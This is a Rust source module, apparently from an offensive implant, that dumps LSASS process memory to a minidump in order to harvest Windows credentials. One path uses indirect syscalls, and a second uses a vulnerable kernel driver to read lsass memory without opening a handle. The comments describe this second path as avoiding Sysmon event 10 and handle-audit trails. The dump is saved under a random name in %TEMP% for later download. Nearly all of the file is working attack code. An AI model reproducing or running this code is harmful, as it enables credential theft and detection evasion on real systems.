//! Credential access (ABR-T032/T033): LSASS minidumps through a custom
//! writer — no dbghelp, no MiniDumpWriteDump, no loader-lock signals.
//!
//! T032 (user-mode): NtOpenProcess(PROCESS_VM_READ|QUERY) on lsass,
//! regions walked with NtQueryVirtualMemory, modules from the remote
//! PEB, data read with NtReadVirtualMemory — all through the
//! indirect-syscall layer. Sysmon EID 10 sees the handle open: that is
//! the accepted, documented detection surface of this variant.
//!
//! T033 (kernel): the iqvw64e kernel-call trampoline (T017) attaches
//! to the lsass address space (KeStackAttachProcess), copies user
//! memory into a kernel pool buffer (memcpy) and detaches — the pool
//! is read back through the driver and freed. NO process handle is
//! opened against lsass: no Sysmon EID 10, no handle-audit trail. The
//! WinIo physical page-table path stays untouched (blacklisted after
//! the 0x1A/0x61941 bugchecks).
//!
//! Output: a .dmp in %TEMP% with a random name; the task result is
//! the path (fetch it with `download`).

// Same on-demand FFI transmute idiom as modules.rs (see the note there).
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;
use crate::message::cred_action;

const STATUS_MASK: u32 = 0x8000_0000;
const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
const SYSTEM_PROCESS_INFORMATION: usize = 5;
const PROCESS_QUERY_LIMITED_INFORMATION: usize = 0x1000;
const PROCESS_QUERY_INFORMATION: usize = 0x0400;
const PROCESS_VM_READ: usize = 0x0010;
const PROCESS_BASIC_INFORMATION: usize = 0;
const MEMORY_BASIC_INFORMATION: usize = 0;
const MEM_COMMIT: u32 = 0x1000;
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_GUARD: u32 = 0x100;

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

/// Entry point of the CRED task.
pub fn stage(action: u8, _arg: &str) -> Result<Vec<u8>, String> {
    match action {
        cred_action::LSASS_USER => {
            let pid = find_pid("lsass.exe").ok_or("lsass.exe not found")?;
            dump_user_mode(pid)
        }
        cred_action::LSASS_KERNEL => {
            let pid = find_pid("lsass.exe").ok_or("lsass.exe not found")?;
            dump_kernel(pid)
        }
        other => Err(format!("unknown cred action {other:#04x}")),
    }
}

// --- shared process lookup ---

fn find_pid(name: &str) -> Option<u32> {
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }?;
    let mut buffer = vec![0u8; 0x8000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt >= 0 {
            break;
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return None;
        }
        buffer.resize(buffer.len() * 2, 0);
    }
    let read_u16 = |off: usize| -> Option<u16> {
        buffer
            .get(off..off + 2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read_u32 = |off: usize| -> Option<u32> {
        buffer
            .get(off..off + 4)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let read_usize = |off: usize| -> Option<usize> {
        buffer.get(off..off + 8).map(|b| {
            let mut bytes = [0u8; 8];
            bytes.copy_from_slice(b);
            usize::from_le_bytes(bytes)
        })
    };
    let mut offset = 0usize;
    while let Some(next) = read_u32(offset) {
        let name_len = read_u16(offset + 0x38).unwrap_or(0) as usize;
        let name_ptr = read_usize(offset + 0x40).unwrap_or(0);
        let pid = read_usize(offset + 0x50).unwrap_or(0);
        if name_len > 0 && name_ptr != 0 {
            let image = read_utf16(name_ptr, name_len);
            if image.eq_ignore_ascii_case(name) {
                return u32::try_from(pid).ok();
            }
        }
        if next == 0 {
            break;
        }
        offset += next as usize;
    }
    None
}

fn read_utf16(ptr: usize, byte_len: usize) -> String {
    let mut units = Vec::with_capacity(byte_len / 2);
    for i in 0..byte_len / 2 {
        let Ok(bytes) =
            unsafe { std::slice::from_raw_parts((ptr + i * 2) as *const u8, 2) }.try_into()
        else {
            break;
        };
        units.push(u16::from_le_bytes(bytes));
    }
    String::from_utf16_lossy(&units)
}

// --- T032: user-mode dump ---

/// One committed readable region.
pub(crate) struct Region {
    pub(crate) base: u64,
    /// Retained for parity with the walk; the dump encodes the length
    /// from the data slice.
    #[allow(dead_code)]
    pub(crate) size: usize,
    pub(crate) data: Vec<u8>,
}

/// One loaded module of the target.
pub(crate) struct ModuleInfo {
    pub(crate) base: u64,
    pub(crate) size: u32,
    pub(crate) name: String,
}

fn nt_open_process(pid: u32, access: usize) -> Result<usize, String> {
    let open = unsafe { syscalls::resolve("NtOpenProcess") }.ok_or("NtOpenProcess unresolved")?;
    let mut attributes = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        ..Default::default()
    };
    let cid = ClientId {
        unique_process: pid as usize,
        unique_thread: 0,
    };
    let mut handle = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            open,
            &mut handle as *mut usize as usize,
            access,
            &mut attributes as *mut ObjectAttributes as usize,
            &cid as *const ClientId as usize,
            0,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || handle == 0 {
        return Err(format!(
            "NtOpenProcess({pid:#x}) failed: {:#010x} (protected-process or 0x1000-derived policy)",
            status as u32
        ));
    }
    Ok(handle)
}

fn nt_read_vm(handle: usize, address: u64, buffer: &mut [u8]) -> Result<(), String> {
    let read = unsafe { syscalls::resolve("NtReadVirtualMemory") }
        .ok_or("NtReadVirtualMemory unresolved")?;
    let mut done = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            read,
            handle,
            address as usize,
            buffer.as_mut_ptr() as usize,
            buffer.len(),
            &mut done as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || done != buffer.len() {
        return Err(format!(
            "NtReadVirtualMemory({address:#x}) short: {done}/{} status {:#010x}",
            buffer.len(),
            status as u32
        ));
    }
    Ok(())
}

fn walk_regions(
    handle: usize,
    read: impl Fn(u64, &mut [u8]) -> Result<(), String>,
) -> Result<Vec<Region>, String> {
    let query = unsafe { syscalls::resolve("NtQueryVirtualMemory") }
        .ok_or("NtQueryVirtualMemory unresolved")?;
    let mut regions = Vec::new();
    let mut address: u64 = 0;
    loop {
        let mut info = [0u8; 48]; // MEMORY_BASIC_INFORMATION (x64)
        let mut returned = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                handle,
                address as usize,
                MEMORY_BASIC_INFORMATION,
                info.as_mut_ptr() as usize,
                info.len(),
                &mut returned as *mut usize as usize,
            )
        };
        if (status as u32) & STATUS_MASK != 0 {
            break; // past the highest user address
        }
        let field =
            |off: usize| -> u64 { u64::from_le_bytes(info[off..off + 8].try_into().unwrap()) };
        let word =
            |off: usize| -> u32 { u32::from_le_bytes(info[off..off + 4].try_into().unwrap()) };
        let base = field(0);
        let size = field(24) as usize;
        let state = word(32);
        let protect = word(36);
        let mtype = word(40);
        if state == MEM_COMMIT
            && protect & (PAGE_NOACCESS | PAGE_GUARD) == 0
            && size > 0
            && base < 0x0000_7FFF_FFFF_FFFF
            && (mtype == 0x20_000 // MEM_PRIVATE
                || mtype == 0x10_000 // MEM_IMAGE (module sections)
                || mtype == 0x40_000)
        {
            // MEM_MAPPED
            let mut data = vec![0u8; size];
            if read(base, &mut data).is_ok() {
                regions.push(Region { base, size, data });
            }
        }
        if size == 0 {
            break;
        }
        address = base.wrapping_add(size as u64);
        if address >= 0x0000_7FFF_FFFF_FFFF {
            break;
        }
    }
    Ok(regions)
}

fn walk_modules(
    handle: usize,
    read: impl Fn(u64, &mut [u8]) -> Result<(), String> + Copy,
) -> Result<Vec<ModuleInfo>, String> {
    let read_u64 = |addr: u64| -> Result<u64, String> {
        let mut bytes = [0u8; 8];
        read(addr, &mut bytes)?;
        Ok(u64::from_le_bytes(bytes))
    };
    let query = unsafe { syscalls::resolve("NtQueryInformationProcess") }
        .ok_or("NtQueryInformationProcess unresolved")?;
    let mut pbi = [0u8; 48];
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            handle,
            PROCESS_BASIC_INFORMATION,
            pbi.as_mut_ptr() as usize,
            pbi.len(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        return Err("PebBaseAddress query failed".into());
    }
    let peb = u64::from_le_bytes(pbi[8..16].try_into().unwrap());
    let ldr = read_u64(peb + 0x18)?;
    let head = ldr + 0x10; // InLoadOrderModuleList
    let mut modules = Vec::new();
    let mut entry = read_u64(head)?;
    for _ in 0..256 {
        if entry == head || entry == 0 {
            break;
        }
        let dll_base = read_u64(entry + 0x30).unwrap_or(0);
        let size_of_image = read_u64(entry + 0x40).unwrap_or(0) as u32;
        let name_len = {
            let mut bytes = [0u8; 2];
            if read(entry + 0x58, &mut bytes).is_ok() {
                u16::from_le_bytes(bytes) as usize
            } else {
                0
            }
        };
        let name_buf = read_u64(entry + 0x60).unwrap_or(0);
        let mut name = String::new();
        if name_len > 0 && name_buf != 0 {
            let mut bytes = vec![0u8; name_len];
            if read(name_buf, &mut bytes).is_ok() {
                let units: Vec<u16> = bytes
                    .as_chunks::<2>()
                    .0
                    .iter()
                    .map(|pair| u16::from_le_bytes(*pair))
                    .collect();
                name = String::from_utf16_lossy(&units);
            }
        }
        if dll_base != 0 {
            modules.push(ModuleInfo {
                base: dll_base,
                size: size_of_image,
                name,
            });
        }
        entry = read_u64(entry)?; // Flink
    }
    Ok(modules)
}

fn dump_user_mode(pid: u32) -> Result<Vec<u8>, String> {
    let handle = nt_open_process(
        pid,
        PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_QUERY_INFORMATION,
    )
    .map_err(|e| format!("T032 user-mode: {e}"))?;
    let close = || {
        if let Some(close) = unsafe { syscalls::resolve("NtClose") } {
            unsafe { syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0) };
        }
    };
    let result = (|| -> Result<Vec<u8>, String> {
        let read = |addr: u64, buf: &mut [u8]| nt_read_vm(handle, addr, buf);
        let regions = walk_regions(handle, read)?;
        let modules = walk_modules(handle, read)?;
        if regions.is_empty() {
            return Err("no readable regions (protected process?)".into());
        }
        let dump = build_minidump(&modules, &regions)?;
        let path = write_temp(&dump)?;
        Ok(format!(
            "T032 lsass dump: {path} ({} regions, {} modules)\n",
            regions.len(),
            modules.len()
        )
        .into_bytes())
    })();
    close();
    let _ = pid;
    result
}

fn write_temp(data: &[u8]) -> Result<String, String> {
    let temp = std::env::var("TEMP").map_err(|_| "TEMP unresolved")?;
    let name = format!("{}\\{:016x}.tmp", temp, rand::random::<u64>());
    std::fs::write(&name, data).map_err(|e| format!("write {name}: {e}"))?;
    Ok(name)
}

// --- T033: kernel-attach dump (no lsass handle) ---

fn dump_kernel(pid: u32) -> Result<Vec<u8>, String> {
    crate::vdm::kernel_attach_dump(pid as u64)
        .map(|path| format!("T033 kernel dump: {path} (no lsass handle opened)\n").into_bytes())
}

// --- minidump writer ---

const STREAM_SYSTEM_INFO: u32 = 7;
const STREAM_MODULE_LIST: u32 = 4;
const STREAM_MEMORY64_LIST: u32 = 9;

pub(crate) fn build_minidump(
    modules: &[ModuleInfo],
    regions: &[Region],
) -> Result<Vec<u8>, String> {
    // Layout: header(32) | directory(3*12) | SystemInfo(56) |
    // ModuleList(4 + 108*n) | Memory64List(16 + 16*r) | region data |
    // module name strings.
    let n_modules = modules.len();
    let n_regions = regions.len();
    let header_len = 32;
    let directory_len = 3 * 12;
    let sysinfo_len = 56u32 as usize;
    let module_list_len = 4 + 108 * n_modules;
    let memory_header_len = 16 + 16 * n_regions;
    let mut data_len = 0usize;
    for region in regions {
        data_len += region.data.len();
    }
    let strings_offset =
        header_len + directory_len + sysinfo_len + module_list_len + memory_header_len + data_len;

    let mut out = Vec::with_capacity(strings_offset + data_len);
    // --- header ---
    out.extend_from_slice(b"MDMP");
    out.extend_from_slice(&0x0000_A793u32.to_le_bytes()); // version
    out.extend_from_slice(&3u32.to_le_bytes()); // number of streams
    out.extend_from_slice(&(header_len as u32).to_le_bytes()); // directory rva
    out.extend_from_slice(&0u32.to_le_bytes()); // checksum
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as u32)
        .unwrap_or(0);
    out.extend_from_slice(&timestamp.to_le_bytes());
    out.extend_from_slice(&0u64.to_le_bytes()); // flags
    out.extend_from_slice(&[0u8; 0]); // pad to 32
    debug_assert_eq!(out.len(), 32);

    let sysinfo_rva = header_len + directory_len;
    let module_list_rva = sysinfo_rva + sysinfo_len;
    let memory_list_rva = module_list_rva + module_list_len;
    let memory_data_rva = memory_list_rva + memory_header_len;

    // --- directory ---
    out.extend_from_slice(&STREAM_SYSTEM_INFO.to_le_bytes());
    out.extend_from_slice(&(sysinfo_len as u32).to_le_bytes());
    out.extend_from_slice(&(sysinfo_rva as u32).to_le_bytes());
    out.extend_from_slice(&STREAM_MODULE_LIST.to_le_bytes());
    out.extend_from_slice(&(module_list_len as u32).to_le_bytes());
    out.extend_from_slice(&(module_list_rva as u32).to_le_bytes());
    out.extend_from_slice(&STREAM_MEMORY64_LIST.to_le_bytes());
    out.extend_from_slice(&(memory_header_len as u32).to_le_bytes());
    out.extend_from_slice(&(memory_list_rva as u32).to_le_bytes());

    // --- SystemInfo stream ---
    out.extend_from_slice(&9u16.to_le_bytes()); // PROCESSOR_ARCHITECTURE_AMD64
    out.extend_from_slice(&0u16.to_le_bytes()); // level
    out.extend_from_slice(&0u16.to_le_bytes()); // revision
    out.extend_from_slice(&1u8.to_le_bytes()); // number of processors
    out.extend_from_slice(&1u8.to_le_bytes()); // product type (VER_NT_WORKSTATION)
    out.extend_from_slice(&10u32.to_le_bytes()); // major
    out.extend_from_slice(&0u32.to_le_bytes()); // minor
    out.extend_from_slice(
        &crate::selfinfo::os_build()
            .and_then(|b| b.split('.').next().map(|s| s.to_string()))
            .and_then(|s| s.parse::<u32>().ok())
            .unwrap_or(0)
            .to_le_bytes(),
    );
    out.extend_from_slice(&1u32.to_le_bytes()); // platform WIN32_NT
    out.extend_from_slice(&0u32.to_le_bytes()); // CSD version rva
    out.extend_from_slice(&0x0100u16.to_le_bytes()); // suite mask
    out.extend_from_slice(&1u16.to_le_bytes()); // product type (wProductType)
    let pad = sysinfo_len - (out.len() - sysinfo_rva);
    out.extend(std::iter::repeat_n(0u8, pad));
    debug_assert_eq!(out.len(), module_list_rva);

    // --- ModuleList stream ---
    out.extend_from_slice(&(n_modules as u32).to_le_bytes());
    let mut string_rvas = Vec::with_capacity(n_modules);
    let mut next_string_rva = strings_offset;
    for module in modules {
        out.extend_from_slice(&module.base.to_le_bytes());
        out.extend_from_slice(&module.size.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes()); // checksum
        out.extend_from_slice(&0u32.to_le_bytes()); // timestamp
        string_rvas.push(next_string_rva as u32);
        out.extend_from_slice(&(next_string_rva as u32).to_le_bytes());
        next_string_rva += 4 + module.name.len() * 2 + 2;
        out.extend(std::iter::repeat_n(0u8, 52)); // VS_FIXEDFILEINFO
        out.extend_from_slice(&0u32.to_le_bytes()); // CvRecord rva
        out.extend_from_slice(&0u32.to_le_bytes()); // CvRecord size
        out.extend_from_slice(&0u32.to_le_bytes()); // MiscRecord rva
        out.extend_from_slice(&0u32.to_le_bytes()); // MiscRecord size
        out.extend_from_slice(&0u64.to_le_bytes()); // Reserved0
        out.extend_from_slice(&0u64.to_le_bytes()); // Reserved1
    }
    debug_assert_eq!(out.len(), memory_list_rva);

    // --- Memory64List stream ---
    out.extend_from_slice(&(memory_data_rva as u64).to_le_bytes());
    out.extend_from_slice(&(n_regions as u64).to_le_bytes());
    for region in regions {
        out.extend_from_slice(&region.base.to_le_bytes());
        out.extend_from_slice(&(region.data.len() as u64).to_le_bytes());
    }
    debug_assert_eq!(out.len(), memory_data_rva);
    for region in regions {
        out.extend_from_slice(&region.data);
    }
    debug_assert_eq!(out.len(), strings_offset);

    // --- module name strings ---
    for (module, rva) in modules.iter().zip(&string_rvas) {
        debug_assert_eq!(out.len() as u32, *rva);
        let units: Vec<u16> = module.name.encode_utf16().collect();
        // MINIDUMP_STRING Length counts BYTES INCLUDING the terminator.
        let byte_len = ((units.len() + 1) * 2) as u32;
        out.extend_from_slice(&byte_len.to_le_bytes());
        for unit in units {
            out.extend_from_slice(&unit.to_le_bytes());
        }
        out.extend_from_slice(&0u16.to_le_bytes()); // L'\0'
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Self-dump through the whole T032 pipeline (our own process is a
    /// legal target): PEB modules, region walk, minidump writer — the
    /// output must parse back as MDMP with our image in the module list.
    #[test]
    fn self_dump_parses() {
        let pid = std::process::id();
        let handle = nt_open_process(
            pid,
            PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_QUERY_INFORMATION,
        )
        .expect("open self");
        let read = |addr: u64, buf: &mut [u8]| nt_read_vm(handle, addr, buf);
        let regions = walk_regions(handle, read).expect("regions");
        let modules = walk_modules(handle, read).expect("modules");
        unsafe {
            if let Some(close) = syscalls::resolve("NtClose") {
                syscalls::dispatch6(close, handle, 0, 0, 0, 0, 0);
            }
        }
        assert!(regions.len() > 10, "suspiciously few regions");
        assert!(
            modules.iter().any(|m| m.name.contains("ntdll")),
            "module list lacks ntdll: {:?}",
            modules
                .iter()
                .map(|m| m.name.clone())
                .take(5)
                .collect::<Vec<_>>()
        );
        let dump = build_minidump(&modules, &regions).expect("build");
        assert!(dump.starts_with(b"MDMP"));
        assert_eq!(u32::from_le_bytes(dump[8..12].try_into().unwrap()), 3);
        // Directory: three typed entries in order.
        let types: Vec<u32> = (0..3)
            .map(|i| u32::from_le_bytes(dump[32 + i * 12..32 + i * 12 + 4].try_into().unwrap()))
            .collect();
        assert_eq!(
            types,
            vec![STREAM_SYSTEM_INFO, STREAM_MODULE_LIST, STREAM_MEMORY64_LIST]
        );
        // Memory64 descriptors must cover the region data length.
        let m64_rva =
            u32::from_le_bytes(dump[32 + 24 + 8..32 + 24 + 12].try_into().unwrap()) as usize;
        let n = u64::from_le_bytes(dump[m64_rva + 8..m64_rva + 16].try_into().unwrap());
        assert_eq!(n as usize, regions.len());
    }

    /// LSASS live dump is elevation-gated; run explicitly with
    /// `--ignored` on the lab host.
    #[test]
    #[ignore = "requires an elevated host touching the real LSASS"]
    fn lsass_user_mode_dump() {
        let out = dump_user_mode(find_pid("lsass.exe").expect("lsass")).expect("dump");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains("T032"));
    }
}
